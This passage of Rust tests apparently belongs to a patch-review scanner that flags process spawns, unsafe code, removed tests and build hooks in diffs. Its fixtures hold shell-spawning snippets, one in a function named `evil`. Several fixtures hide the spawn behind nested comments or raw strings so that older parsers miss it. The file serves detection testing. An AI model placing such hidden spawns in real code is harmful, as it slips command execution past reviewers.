        ];
        const NEXT: [&str; 7] = ["", "{}", "}", "{ }", "x", "{", "pass"];
        let mut seed = 0x5EED_F1D5_0000_0009_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let mut found = 0;
        for case in 0..60_000 {
            let language = [Language::JavaScript, Language::Python, Language::Go][case % 3];
            let mut atoms = |most: usize| -> String {
                (0..next(most)).map(|_| ATOMS[next(ATOMS.len())]).collect()
            };
            let line = if case % 2 == 0 {
                atoms(11)
            } else {
                let (before, after) = (atoms(3), atoms(3));
                let head = HEADS[next(HEADS.len())];
                let middle = MIDDLES[next(MIDDLES.len())];
                let tail = TAILS[next(TAILS.len())];
                format!("{before}{head}{middle}{tail}{after}")
            };
            let following = (next(4) > 0).then(|| NEXT[next(NEXT.len())]);
            let released = released_empty_handler(language, &line, following);
            assert_eq!(
                empty_handler(language, &line, following),
                released,
                "{language:?}: {line:?} then {following:?}"
            );
            found += usize::from(released);
        }
        assert!(found > 1_000, "{found} empty handlers");
    }

    /// The lines of the long-line test: every trigger the readers know, in the path of each
    /// language its table names (2026-11-18, the rule of the class "cost quadratic in the length
    /// of one line": no check walks from a match to the end of its line more than once for a
    /// line). Built from the tables, so a new token, keyword, word or prefix is in it:
    /// each rule's tokens, modules (after `require`, `import` and `from`), spaced heads and
    /// tails and secret prefixes; the empty-handler rule, which has no table, by the words it
    /// starts from; the JavaScript operand keywords; the Rust token reader's words; the shell's
    /// list words with `case` and `esac`; and every ASCII punctuation byte in every language.
    fn long_line_cases() -> Vec<(&'static str, String)> {
        const LANGUAGES: [Language; 6] = [
            Language::Rust,
            Language::Python,
            Language::JavaScript,
            Language::Go,
            Language::Shell,
            Language::Yaml,
        ];
        let path = |language: Language| match language {
            Language::Rust => "src/x.rs",
            Language::Python => "x.py",
            Language::JavaScript => "x.ts",
            Language::Go => "x.go",
            Language::Shell => "x.sh",
            Language::Yaml => "x.yml",
        };
        let text = |bytes: &[u8]| String::from_utf8(bytes.to_vec()).unwrap();
        let mut cases = std::collections::BTreeSet::new();
        for rule in RULES.iter().chain(LEGACY_RUST_RULES).chain(RELEASED_RULES) {
            let paths: Vec<&str> = match rule.scope {
                Scope::Languages(languages) => languages.iter().map(|l| path(*l)).collect(),
                other => vec![sample_path(other)],
            };
            let triggers: Vec<String> = match rule.matches {
                Match::Tokens(tokens) => tokens
                    .iter()
                    .map(|token| token.trim_end_matches('*').to_owned())
                    .collect(),
                Match::Imports(modules) => modules
                    .iter()
                    .flat_map(|m| {
                        [
                            format!("require('{m}')"),
                            format!("import '{m}'"),
                            format!("from '{m}'"),
                        ]
                    })
                    .collect(),
                Match::Spaced { heads, tails } => heads
                    .iter()
                    .flat_map(|h| {
                        tails
                            .iter()
                            .flat_map(move |t| [format!("{h}{t}"), format!("{h} {t}")])
                    })
                    .collect(),
                Match::Secret => SECRET_PREFIXES
                    .iter()
                    .map(|(p, _, _)| (*p).to_owned())
                    .collect(),
                Match::EmptyHandler => [
                    "catch",
                    "catch(",
                    "catch (",
                    ".catch(",
                    ".catch((",
                    "except",
                    "if err != nil {",
                ]
                .map(str::to_owned)
                .to_vec(),
                Match::AnyCode => Vec::new(),
            };
            for path in &paths {
                for trigger in &triggers {
                    cases.insert((*path, trigger.clone()));
                }
            }
        }
        for keyword in crate::lexical::JS_OPERAND_KEYWORDS {
            cases.insert((path(Language::JavaScript), text(keyword)));
        }
        for word in crate::rust_tokens::word_names() {
            cases.insert((path(Language::Rust), text(word)));
        }
        for word in crate::lexical::SHELL_LIST_WORDS
            .iter()
            .chain(&[&b"case"[..], b"esac"])
        {
            cases.insert((path(Language::Shell), text(word)));
        }
        for language in LANGUAGES {
            for byte in (b'!'..=b'~').filter(u8::is_ascii_punctuation) {
                cases.insert((path(language), char::from(byte).to_string()));
            }
        }
        cases.into_iter().collect()
    }

    /// Rank, on as many threads as the host has, two lines of 2 MiB for each case: its trigger
    /// repeated, and one word that ends in it. What each costs is the thread CPU time of its
    /// ranking. Returns the lines over `bound` and the slowest line; fails when a line has no
    /// answer within ten times `bound` of wall time.
    fn long_lines_over(
        cases: Vec<(&'static str, String)>,
        bound: std::time::Duration,
    ) -> (Vec<String>, (std::time::Duration, String)) {
        use std::sync::{Arc, Mutex, mpsc};
        const SIZE: usize = 2 * 1024 * 1024;
        type Item = (&'static str, String, bool);
        let items: Vec<Item> = cases
            .into_iter()
            .flat_map(|(path, trigger)| [(path, trigger.clone(), true), (path, trigger, false)])
            .collect();
        let total = items.len();
        let queue = Arc::new(Mutex::new(items));
        let (said, heard) = mpsc::channel::<(Item, Option<std::time::Duration>)>();
        let workers = std::thread::available_parallelism().map_or(4, std::num::NonZero::get);
        for _ in 0..workers {
            let (queue, said) = (Arc::clone(&queue), said.clone());
            std::thread::spawn(move || {
                loop {
                    let Some(item) = queue.lock().unwrap().pop() else {
                        return;
                    };
                    let (name, trigger, repeated) = &item;
                    let line = if *repeated {
                        let mut line = trigger.repeat(SIZE / trigger.len() + 1);
                        line.truncate(SIZE);
                        line
                    } else {
                        format!("{}{trigger}", "a".repeat(SIZE - trigger.len()))
                    };
                    // A blank line of context on each side, as Git writes it (0.10.0; was
                    // `@@ -2,0 +3,1 @@`).
                    let patch =
                        format!("--- a/{name}\n+++ b/{name}\n@@ -2,2 +2,3 @@\n \n+{line}\n \n");
                    let _ = said.send((item.clone(), None));
                    let files = parse(&patch).unwrap();
                    let start = ScanClock::start();
                    let ranked = crate::rank(&files);
                    let spent = start.elapsed();
                    assert_eq!(ranked.len(), 1);
                    let _ = said.send((item, Some(spent)));
                }
            });
        }
        drop(said);
        let (mut started, mut over, mut slowest, mut done) = (
            Vec::new(),
            Vec::new(),
            (std::time::Duration::ZERO, String::new()),
            0,
        );
        let name = |(path, trigger, repeated): &Item| {
            let form = if *repeated {
                "repeated"
            } else {
                "ending a word"
            };
            format!("{path}: {trigger:?} {form}")
        };
        while done < total {
            match heard.recv_timeout(bound * 10) {
                Ok((item, None)) => started.push(item),
                Ok((item, Some(spent))) => {
                    done += 1;
                    started.retain(|other| *other != item);
                    if spent > slowest.0 {
                        slowest = (spent, name(&item));
                    }
                    if spent > bound {
                        over.push(format!("{} took {spent:?}", name(&item)));
                    }
                }
                Err(mpsc::RecvTimeoutError::Timeout | mpsc::RecvTimeoutError::Disconnected) => {
                    panic!(
                        "no answer within {:?} for {}",
                        bound * 10,
                        started.iter().map(name).collect::<Vec<_>>().join("; ")
                    )
                }
            }
        }
        (over, slowest)
    }

    /// The bound of the long-line tests: a line of 2 MiB ranks inside it in thread CPU time
    /// (ten seconds in a debug build, two in a release build).
    fn long_line_bound() -> std::time::Duration {
        std::time::Duration::from_secs(if cfg!(debug_assertions) { 10 } else { 2 })
    }

    /// Every long-line case ([`long_line_cases`]: 397 triggers on 2026-11-18, 794 lines of 2
    /// MiB) ranks inside the bound ([`long_line_bound`]). The lines are ranked on as many
    /// threads as the host has (2026-11-18, 16 threads: 6 s for all of them in a release
    /// build, the slowest 0.22 s; 67 s in a debug build, the slowest 3.2 s).
    #[test]
    fn long_lines_of_every_trigger_rank_in_bounded_time() {
        let cases = long_line_cases();
        let count = cases.len();
        let (over, slowest) = long_lines_over(cases, long_line_bound());
        println!("{count} cases, {} lines; slowest {slowest:?}", count * 2);
        assert!(over.is_empty(), "over the bound: {over:#?}");
    }

    /// The time a scan spends: the thread's own CPU time where Linux reports it, so a busy host
    /// does not fail the bound (a starved run measured 1.8 s of CPU in over 10 s of wall time),
    /// and wall time elsewhere.
    struct ScanClock {
        kind: &'static str,
        cpu_ns: Option<u64>,
        wall: std::time::Instant,
    }

    impl ScanClock {
        fn start() -> Self {
            let cpu_ns = thread_cpu_ns();
            #[expect(
                clippy::disallowed_methods,
                reason = "test door: the fallback clock where no CPU time is reported"
            )]
            let wall = std::time::Instant::now();
            let kind = if cpu_ns.is_some() {
                "thread CPU time"
            } else {
                "wall time"
            };
            Self { kind, cpu_ns, wall }
        }

        fn elapsed(&self) -> std::time::Duration {
            match (self.cpu_ns, thread_cpu_ns()) {
                (Some(then), Some(now)) => std::time::Duration::from_nanos(now - then),
                _ => self.wall.elapsed(),
            }
        }
    }

    /// The calling thread's CPU time in nanoseconds: the first field of Linux's
    /// `/proc/thread-self/schedstat`, or `None` where that file does not exist.
    fn thread_cpu_ns() -> Option<u64> {
        let stat = std::fs::read_to_string("/proc/thread-self/schedstat").ok()?;
        stat.split_whitespace().next()?.parse().ok()
    }

    /// Run `work` on its own thread and fail if it takes more than two minutes of wall time.
    /// This bound only keeps a hang from stalling the suite, so a diff-mutation run reports a
    /// looping mutant as caught rather than as a timeout; the scan's cost is bounded by
    /// [`ScanClock`] inside the work.
    fn within_deadline<T: Send + 'static>(work: impl FnOnce() -> T + Send + 'static) -> T {
        let (done, wait) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = done.send(work());
        });
        wait.recv_timeout(std::time::Duration::from_secs(120))
            .expect("a long line was scanned within two minutes")
    }

    /// The import rule's receiver, boundary, `typeof` and statement decisions, each pinned.
    #[test]
    fn import_rule_decisions_are_exact() {
        for (line, spawn) in [
            (r#"const cp = foo.require("child_process");"#, false),
            (r#"const cp = requirex("child_process");"#, false),
            (r#"const t = typeof require("child_process");"#, true),
            (
                r#"x = Array.from(y); import type {A} from "child_process";"#,
                false,
            ),
            (
                r#"x = Array.from(y); import {A} from "child_process";"#,
                true,
            ),
        ] {
            let expected: &[EvidenceSignal] = if spawn { &[S::ProcessSpawn] } else { &[] };
            assert_eq!(signals(&added("a.ts", &[line])), expected, "{line}");
        }
    }

    #[test]
    fn child_process_imports_are_spawn_evidence() {
        for line in [
            r#"const cp = require("child_process");"#,
            "import { execFile } from 'node:child_process';",
            r#"const { spawn } = await import("child_process");"#,
        ] {
            assert_eq!(
                signals(&added("a.js", &[line])),
                [S::ProcessSpawn],
                "{line}"
            );
        }
        // Naming another module, or the name alone in a message, is not.
        assert_eq!(
            signals(&added("a.js", &[r#"log("child process done")"#])),
            []
        );
    }

    #[test]
    fn removed_tests_are_read_on_the_old_side() {
        let file = removed("src/x.rs", &["#[test]", "fn t() {}"]);
        let found = file_evidence(&file);
        assert_eq!(found.len(), 1);
        assert_eq!(
            (found[0].signal, found[0].side, found[0].line),
            (S::TestRemoved, Side::Old, 2)
        );
        // Adding a test is not evidence of anything.
        assert_eq!(signals(&added("src/x.rs", &["#[test]"])), []);
    }

    /// Until 2026-11-14 the Rust code view ended a block comment at the first `*/` and lost
    /// step after a character literal with a long escape, so a removed test behind either was
    /// not read (the published v0.8.3 binary reports nothing for these two hunks). The
    /// compiler nests the comment and reads the literal whole, and so does the view now.
    #[test]
    fn a_removed_test_behind_a_nested_comment_or_a_long_escape_is_found() {
        let cases: [(&[&str], u32); 2] = [
            (&["/* /* */ // */ #[test]", "fn t() {}"], 2),
            (&[r#"let _ = ('\x41','"', "/*");"#, "#[test]"], 3),
        ];
        for (lines, line) in cases {
            let found: Vec<_> = file_evidence(&removed("src/x.rs", lines))
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, [(S::TestRemoved, Side::Old, line)], "{lines:?}");
        }
    }

    /// What 0.8.3 found in Rust is found, whatever else is. A hunk can start inside a string or
    /// a comment opened above it, and then neither reading of Rust is the compiler's: each can
    /// come back to code where the other does not. Each patch below is one where the reading
    /// of 0.8.3 finds real code and the lexer reading alone finds nothing (measured on the
    /// published v0.8.3 binary: the items expected here, and scores 6, 5, 6 and 5).
    /// - A list kept in a string, with a glob of two wildcard directories: `/*`, `/*` and
    ///   `*/` to a reader that started in code. The reading of 0.8.3 ends its comment at the
    ///   `*/`; the nesting reading is still one deep at the end of the hunk. `git diff`
    ///   writes this hunk for a function added below such a list.
    /// - The same list above a removed test, for the old side.
    /// - Shell text in a raw string with an apostrophe before a quote: the lexer reading
    ///   takes `'\t"%s\n'` for a character literal, and the closing `"#` then opens a string.
    /// - Two added lines of a `build.rs` that hold nothing but a character literal with a
    ///   long escape and one of several bytes: blank to the lexer reading, not to 0.8.3's.
    #[test]
    fn what_the_reading_of_0_8_3_finds_from_an_unknown_start_is_found() {
        let glob = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,6 +8,10 @@\n     LICENSE\n     \
                    crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n+pub fn run(cmd: &str) \
                    -> bool {\n+    std::process::Command::new(\"sh\").arg(cmd).status().is_ok()\
                    \n+}\n+\n fn main() {\n";
        let removed_test = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,10 +8,6 @@\n     \
                            LICENSE\n     crates/*/*/Cargo.toml\n     docs/README.md\n \";\n \n\
                            -#[test]\n-fn patterns_are_checked() {\n-    \
                            assert!(PATTERNS.lines().count() > 3);\n-}\n fn main() {\n";
        let apostrophe = "--- a/src/main.rs\n+++ b/src/main.rs\n@@ -8,8 +8,8 @@\n     set -eu\n     \
                          cd \"$1\"\n     make\n-    printf done\n-\"#; pub fn f() { g() }\n\
                          +    printf '\\t\"%s\\n' done\n+\"#; pub fn f() { unsafe { \
                          hint2::run(g) } }\n \n \n mod hint2 { pub unsafe fn run(f: fn()) { f() } }\n";
        let build = "--- a/build.rs\n+++ b/build.rs\n@@ -3,2 +3,4 @@\n const T: [char; 2] = [\n\
                     +'\\x41'\n+'é'\n     ];\n";
        let cases: [(&str, &[Found]); 4] = [
            (glob, &[(S::ProcessSpawn, Side::New, 14)]),
            (removed_test, &[(S::TestRemoved, Side::Old, 13)]),
            (apostrophe, &[(S::UnsafeAdded, Side::New, 12)]),
            (
                build,
                &[(S::BuildHook, Side::New, 4), (S::BuildHook, Side::New, 5)],
            ),
        ];
        for (patch, expected) in cases {
            let file = parse(patch).unwrap().remove(0);
            let items = |views_of| -> Vec<Found> {
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RELEASED_RULES
                    .iter()
                    .filter(|r| kind.admits(r.scope))
                    .collect();
                hunk_matches_in(&file.patch_twin.hunks[0], kind.language, &rules, views_of)
                    .into_iter()
                    .map(|(side, signal, line)| (signal, side, line))
                    .collect()
            };
            assert_eq!(items(Asked::All), expected, "{patch}");
            assert_eq!(items(Asked::Released), expected, "0.8.3's reading: {patch}");
            assert_eq!(items(Asked::Lexer), [], "the lexer reading: {patch}");
            let found: Vec<_> = file_evidence(&file)
                .iter()
                .map(|e| (e.signal, e.side, e.line))
                .collect();
            assert_eq!(found, expected, "{patch}");
        }
    }

    /// An item as the tests of the two readings compare it.
    type Found = (S, Side, u32);

    /// The list 0.8.3 would print for `file`: what its reading alone finds in each hunk, in the
    /// order of the file, cut at the bound.
    fn listed_by_0_8_3(file: &ReviewFile) -> Vec<Found> {
        let kind = FileKind::of(file);
        let rules: Vec<&Rule> = RELEASED_RULES
            .iter()
            .filter(|r| kind.admits(r.scope))
            .collect();
        file.patch_twin
            .hunks
            .iter()
            .flat_map(|hunk| hunk_matches_in(hunk, kind.language, &rules, Asked::Released))
            .map(|(side, signal, line)| (signal, side, line))
            .take(MAX_EVIDENCE_PER_FILE)
            .collect()
    }

    /// What the bounded list of `file` must hold, whatever further readings find: every item
    /// 0.8.3 would list; as many items as the bound allows; in the order of the file; and it
    /// says so when there is more. Returns whether the list is cut, and how many of the items
    /// 0.8.3 would list a cut after the first 32 items of all readings would have dropped.
    fn bounded_list_holds(file: &ReviewFile, text: &str) -> (bool, usize) {
        let all = file_evidence(file);
        let ranked = crate::rank::RankedFile::scored(file);
        let found = |e: &Evidence| (e.signal, e.side, e.line);
        let listed: Vec<Found> = ranked.evidence.iter().map(found).collect();
        let by_0_8_3 = listed_by_0_8_3(file);
        for item in &by_0_8_3 {
            assert!(listed.contains(item), "0.8.3 lists {item:?}:\n{text}");
        }
        assert_eq!(listed.len(), all.len().min(MAX_EVIDENCE_PER_FILE), "{text}");
        assert_eq!(ranked.evidence_truncated, all.len() > MAX_EVIDENCE_PER_FILE);
        let mut rest = all.iter();
        for item in &ranked.evidence {
            assert!(
                rest.any(|e| e == item),
                "not in the order of the file:\n{text}"
            );
        }
        let first: Vec<Found> = all.iter().take(MAX_EVIDENCE_PER_FILE).map(found).collect();
        let dropped = by_0_8_3.iter().filter(|item| !first.contains(item)).count();
        (ranked.evidence_truncated, dropped)
    }

    /// At the bound of 32 the list still holds what 0.8.3 listed. For generated Rust files of
    /// 40 to 120 changed lines, heavy with rule tokens and with the pieces the readings
    /// disagree about (as a new file, as added lines and as removed lines): the list 0.8.3
    /// would print, which is its reading alone cut at 32, is contained in the list printed;
    /// the list is as long as the bound allows and in the order of the file; and an item is
    /// marked released exactly when the reading of 0.8.3 alone finds it. Many of these lists
    /// are cut, and in many a cut after the first 32 items of all readings would have dropped
    /// an item 0.8.3 listed.
    #[test]
    fn the_bounded_list_holds_every_item_0_8_3_listed() {
        use std::fmt::Write as _;
        const ATOMS: [&str; 14] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
            "/*",
            "*/",
            "\"",
            "'",
            "x",
            " ",
            "// */",
            "crates/*/*/Cargo.toml",
        ];
        let mut seed = 0x1234_5678_9ABC_DEF1_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        let (mut cut, mut would_drop) = (0, 0);
        for case in 0..400 {
            let count = 40 + next(81);
            let sign = if case % 3 == 2 { '-' } else { '+' };
            let mut body = String::new();
            for _ in 0..count {
                // Mostly a rule token alone; often behind the nested comment, which hides
                // it from the reading of 0.8.3 only; now and then one of the other pieces.
                let before = match next(40) {
                    0 => ATOMS[5],
                    1 => ATOMS[6 + next(8)],
                    2..=11 => ATOMS[4],
                    _ => "",
                };
                let _ = writeln!(body, "{sign}{before}{}", ATOMS[next(4)]);
            }
            let text = match case % 3 {
                0 => format!("--- /dev/null\n+++ b/src/x.rs\n@@ -0,0 +1,{count} @@\n{body}"),
                1 => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,1 +1,{} @@\n x\n{body}",
                    count + 1
                ),
                _ => format!(
                    "--- a/src/x.rs\n+++ b/src/x.rs\n@@ -1,{} +1,1 @@\n x\n{body}",
                    count + 1
                ),
            };
            let file = parse(&text).unwrap().remove(0);
            let (is_cut, dropped) = bounded_list_holds(&file, &text);
            cut += usize::from(is_cut);
            would_drop += usize::from(dropped > 0);
            // An item is released exactly when the reading of 0.8.3 alone finds it.
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RELEASED_RULES
                .iter()
                .filter(|r| kind.admits(r.scope))
                .collect();
            let hunk = &file.patch_twin.hunks[0];
            let alone = hunk_matches_in(hunk, kind.language, &rules, Asked::Released);
            let (items, marks) = file_evidence_marked(&file, Share::Own);
            assert_eq!(marks, file_evidence_released(&file));
            for (item, released) in items.iter().zip(marks) {
                assert_eq!(
                    released,
                    alone.contains(&(item.side, item.signal, item.line)),
                    "{item:?}:\n{text}"
                );
            }
        }
        assert!(
            cut > 100 && would_drop > 30,
            "{cut} lists cut, {would_drop} where a plain cut would have dropped an item of 0.8.3"
        );
    }

    /// `'r#r"\"` is read by each reading as its editions read it, and the rules read both: the
    /// text written for editions 2015 and 2018 is found by the reading of 0.8.3 (as 0.8.3
    /// found it), the text written for 2021 and 2024 by the lexer reading (0.8.3 missed it).
    #[test]
    fn a_raw_lifetime_before_a_string_hides_nothing_in_any_edition() {
        for (line, by_legacy, by_lexer) in [
            (
                r#"m!('r#r"\"); let s = std::process::Command::new("sh").status(); m!("");"#,
                true,
                false,
            ),
            (
                r#"m!('r#r"\" /* "); let s = std::process::Command::new("sh").status(); m!(" */ ");"#,
                false,
                true,
            ),
        ] {
            let file = added("src/x.rs", &[line]);
            assert_eq!(signals(&file), [S::ProcessSpawn], "{line}");
            let kind = FileKind::of(&file);
            let rules: Vec<&Rule> = RELEASED_RULES
                .iter()
                .filter(|r| kind.admits(r.scope))
                .collect();
            let hunk = &file.patch_twin.hunks[0];
            for (views_of, finds) in [(Asked::Released, by_legacy), (Asked::Lexer, by_lexer)] {
                let found = hunk_matches_in(hunk, kind.language, &rules, views_of);
                assert_eq!(!found.is_empty(), finds, "{line}");
            }
        }
    }

    /// No answer is lower than 0.8.3's, by construction, and this holds the construction: for
    /// Rust text of every shape a hunk can have, what the rules find is what the reading of
    /// 0.8.3 finds together with what the lexer reading finds, each read alone. Nothing the
    /// first finds is missing, and nothing is found that neither finds (their bytes are never
    /// mixed into a view of their own). The reading of 0.8.3 is the shared scanner's, whose
    /// code is the released code (`lexical.rs` differs from the release by added lines only),
    /// and it carries a state the other reading never touches. A file's score adds a weight of
    /// at least 1 for each signal found, so it is never lower either.
    ///
    /// The text is made from the pieces the two readings disagree about (quotes, comment
    /// openers and closers, character literals with long escapes, raw strings and prefixes)
    /// with rule tokens between them, as a new file, as added lines below a context line, as
    /// removed lines, and as a mix of context, added and removed lines, on a source path and
    /// on `build.rs`. Other languages have one reading, which is `code_view` itself.
    #[test]
    fn rust_items_are_those_of_0_8_3_and_those_of_the_lexer_reading() {
        const ATOMS: [&str; 42] = [
            "unsafe { g() }",
            "std::process::Command::new(\"sh\")",
            "reqwest::blocking::get(u)",
            "#[test]",
            "fn t() {}",
            "/*",
            "*/",
            "//",
            "\"",
            "'",
            "'\\x41'",
            "'\"'",
            "'\\u{1F600}'",
            "'é'",
            "r\"",
            "r#\"",
            "\"#",
            "b'",
            "b\"",
            "'r#r",
            "k#r",
            "cr\"",
            "\\",
            "\\\"",
            "crates/*/*/Cargo.toml",
            " ",
            " ",
            "x",
            ";",
            "1e",
            "#",
            "/",
            "*",
            "'a",
            "'\\''",
            "/* /* */",
            "// */",
            "\"/*\"",
            "'\\t\"%s\\n'",
            "é",
            "/* /* */ // */ ",
            "('\\x41','\"', \"/*\"); ",
        ];
        let mut seed = 0x9E37_79B9_7F4A_7C15_u64;
        let mut next = move |below: usize| {
            seed ^= seed << 13;
            seed ^= seed >> 7;
            seed ^= seed << 17;
            usize::try_from(seed % (below as u64)).unwrap()
        };
        assert!(S::ALL.iter().all(|signal| signal.weight() >= 1));
        let (mut only_legacy, mut only_lexer, mut items_seen) = (0, 0, 0);
        for case in 0..4000 {
            let lines: Vec<String> = (0..=next(8))
                .map(|_| (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect())
                .collect();
            let path = if case % 5 == 0 {
                "build.rs"
            } else {
                "src/x.rs"
            };
            let (mut old, mut new, mut body) = (0, 0, String::new());
            for line in &lines {
                let sign = match case % 4 {
                    0 | 1 => '+',
                    2 => '-',
                    _ => [' ', '+', '-'][next(3)],
                };
                old += u32::from(sign != '+');
                new += u32::from(sign != '-');
                body.push(sign);
                body.push_str(line);
                body.push('\n');
            }
            let text = match case % 4 {
                0 => format!("--- /dev/null\n+++ b/{path}\n@@ -0,0 +1,{new} @@\n{body}"),
                1 | 2 => format!(
                    "--- a/{path}\n+++ b/{path}\n@@ -1,{} +1,{} @@\n x\n{body}",
                    old + 1,
                    new + 1
                ),
                _ => format!("--- a/{path}\n+++ b/{path}\n@@ -7,{old} +7,{new} @@\n{body}"),
            };
            let Ok(mut files) = parse(&text) else {
                continue; // a mix with no changed line is no patch
            };
            let file = files.remove(0);
            let kind = FileKind::of(&file);
            assert_eq!(kind.language, Some(Language::Rust));
            let rules: Vec<&Rule> = RELEASED_RULES
                .iter()
                .filter(|r| kind.admits(r.scope))
                .collect();
            let hunk = &file.patch_twin.hunks[0];
            let all = hunk_matches_in(hunk, kind.language, &rules, Asked::All);
            let legacy = hunk_matches_in(hunk, kind.language, &rules, Asked::Released);
            let lexer = hunk_matches_in(hunk, kind.language, &rules, Asked::Lexer);
            for item in &legacy {
                assert!(all.contains(item), "0.8.3 finds {item:?}:\n{text}");
            }
            for item in &all {
                assert!(
                    legacy.contains(item) || lexer.contains(item),
                    "neither reading finds {item:?}:\n{text}"
                );
            }
            for item in &lexer {
                assert!(
                    all.contains(item),
                    "the lexer reading finds {item:?}:\n{text}"
                );
            }
            assert_eq!(hunk_matches(hunk, kind.language, &rules), all);
            items_seen += all.len();
            only_legacy += usize::from(legacy.iter().any(|item| !lexer.contains(item)));
            only_lexer += usize::from(lexer.iter().any(|item| !legacy.contains(item)));
        }
        // The generator bites: many items, and many hunks in which one reading finds what the
        // other does not, in each direction.
        assert!(
            items_seen > 2000 && only_legacy > 100 && only_lexer > 100,
            "{items_seen} items, {only_legacy} hunks only 0.8.3 reads, {only_lexer} only the lexer"
        );
        // Every other language has one reading, the shared scanner's.
        for language in [
            Language::Python,
            Language::JavaScript,
            Language::Go,
            Language::Shell,
            Language::Yaml,
        ] {
            let (mut readings, mut state) = (Readings::default(), ScanState::default());
            for _ in 0..500 {
                let line: String = (0..=next(6)).map(|_| ATOMS[next(ATOMS.len())]).collect();
                assert_eq!(
                    code_views(language, &line, &mut readings),
                    [code_view(language, &line, &mut state)],
                    "{language:?}: {line}"
                );
            }
        }
    }

    /// The items of a patch as the tests of hunks compare them.
    fn items(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        file_evidence(&file)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect()
    }

    /// The evidence the reading of release 0.8.4 alone finds in `file`, read with `share`
    /// ([`HunkLabels`], by the rules of that release): `file_evidence` as that release had it.
    /// Since the merge with the integrity signals a file's evidence is this and what their
    /// readings add, so the tests that state what the reading of 0.8.4 finds compare with this,
    /// and the evidence of the file is held to hold all of it.
    fn released_evidence(file: &ReviewFile, share: Share) -> Vec<Evidence> {
        let mut labels = HunkLabels::sharing(file, share);
        let mut out = Vec::new();
        for (index, hunk) in file.patch_twin.hunks.iter().enumerate() {
            for (side, signal, line, released) in labels.matches(index) {
                out.push(Evidence {
                    signal,
                    basis: Basis::Lexical,
                    hunk: hunk.id,
                    address: hunk.address(&file.path),
                    side,
                    line,
                    test_likely: false,
                    released,
                });
            }
        }
        let all = file_evidence_marked(file, share).0;
        for item in &out {
            assert!(
                all.iter().any(|e| (e.hunk, e.side, e.signal, e.line)
                    == (item.hunk, item.side, item.signal, item.line)),
                "the file's evidence lacks an item of the reading of 0.8.4: {item:?}"
            );
        }
        out
    }

    /// [`items`] of the reading of release 0.8.4 alone ([`released_evidence`]).
    fn released_items(patch: &str) -> Vec<Found> {
        let file = parse(patch).unwrap().remove(0);
        released_evidence(&file, Share::Own)
            .iter()
            .map(|e| (e.signal, e.side, e.line))
            .collect()
    }

    /// A file the patch creates is one text, however many hunks it is written in: what one
    /// hunk leaves open (a block comment here, one deep and two deep) is open in the next.
    /// Read alone, the second hunk is a line comment and nothing else, which is how 0.8.3 and
    /// every release before it read it (the published v0.8.3 binary: score 4, no evidence, for
    /// each of the split forms below).
    ///
    /// What plain `git apply` (2.56.0, `--check -v` and then applied, in scratch repositories)
    /// does with a creation written in several hunks:
    /// - `@@ -0,0 +1,2 @@` then `@@ -2,0 +3,2 @@`: accepted, the lines in patch order.
    /// - a second hunk `@@ -9,0 +3,2 @@`, `@@ -2,0 +1,2 @@` or `@@ -9,0 +9,2 @@`: accepted
    ///   ("Hunk #2 succeeded at 3"), the same file. Its numbers do not place it: a hunk with no
    ///   context after its last line must end the file as it then is, so each is appended.
    /// - a second hunk `@@ -0,0 +3,2 @@` or `@@ -1,0 +3,2 @@`: refused (it would also have to
    ///   begin the file). A hunk with a context line: refused ("new file depends on old
    ///   contents"). Three hunks `-0,0`, `-2,0`, `-3,0`: accepted, in order.
    ///
    /// So every hunk of a creation only adds, and each follows the one before.
    #[test]
    fn the_hunks_of_a_created_file_are_read_as_one_text() {
        let spawn = "pub fn evil() { std::process::Command::new(\"sh\").status().ok(); }";
        let head = "--- /dev/null\n+++ b/src/evil.rs\n";
        for (opener, closer) in [
            ("/*", "// */"),
            ("/* /*", " */ // */"),
            ("const S: &str = \"", "// \";"),
            ("const S: &str = r#\"", "// \"#;"),
        ] {
            let joined = format!(
                "{head}@@ -0,0 +1,4 @@\n+//! Helpers.\n+{opener}\n+{closer} {spawn}\n+pub fn k() {{}}\n"
            );
            let found = [(S::ProcessSpawn, Side::New, 3)];
            assert_eq!(items(&joined), found, "{joined}");
            // Numbered after the first hunk, the second is placed by Git at the end: refused.
            for second in ["-0,0 +3,2", "-2,0 +3,2", "-9,0 +3,2"] {
                let split = format!(
                    "{head}@@ -0,0 +1,2 @@\n+//! Helpers.\n+{opener}\n@@ {second} @@\n+{closer} {spawn}\n+pub fn k() {{}}\n"
                );
                if second != "-0,0 +3,2" {
                    assert!(placed_elsewhere(&split), "{split}");
                    continue;
                }
                assert_eq!(items(&split), found, "{split}");
                // Read alone, as before, the second hunk shows nothing.
                let file = parse(&split).unwrap().remove(0);
                let kind = FileKind::of(&file);
                let rules: Vec<&Rule> = RELEASED_RULES
                    .iter()
                    .filter(|r| kind.admits(r.scope))
                    .collect();
                assert_eq!(
                    hunk_matches(&file.patch_twin.hunks[1], kind.language, &rules),
                    [],
                    "{split}"
                );
            }
        }
        // Three hunks, with a hunk between the opener and the closer that changes nothing.
        let three = format!(
            "{head}@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n+words\n@@ -0,0 +3,1 @@\n+// */ {spawn}\n"
        );
        assert_eq!(items(&three), [(S::ProcessSpawn, Side::New, 3)]);
        // Other languages have the same boundary and the same rule.
        let script = "--- /dev/null\n+++ b/web/run.js\n@@ -0,0 +1,1 @@\n+/*\n@@ -0,0 +2,1 @@\n\
                      +// */ const cp = require(\"child_process\");\n";
        assert_eq!(items(script), [(S::ProcessSpawn, Side::New, 2)]);
